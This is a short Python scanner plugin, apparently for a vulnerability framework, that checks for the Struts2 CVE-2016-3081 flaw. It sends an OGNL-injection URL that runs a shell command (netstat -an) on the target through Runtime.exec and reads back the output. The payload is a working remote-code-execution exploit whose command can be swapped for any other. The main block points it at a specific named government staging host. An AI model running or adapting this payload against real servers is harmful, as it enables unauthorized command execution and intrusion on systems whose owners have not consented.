#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = struts2 CVE-2016-3081
#__Refer___ = http://www.wooyun.org/content/26856

import re
import random

def assign(service, arg):
    if service == 'struts':
        return True, arg

def audit(arg):
    cmd='netstat%20-an'
    fin_url = """{url}?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd={cmd}&pp=\\\\A&ppp=%20&encoding=UTF-8""".format(url=arg,cmd=cmd)
    code, _, res, _, _ = curl.curl2(fin_url)
    if code == 200 and ('ESTABLISHED' in res or "0.0.0.0" in res):
        security_hole(arg )


if __name__ == "__main__":
    from dummy import *
    audit(assign("struts", "https://homolog.govdigital.com.br/index.action")[1])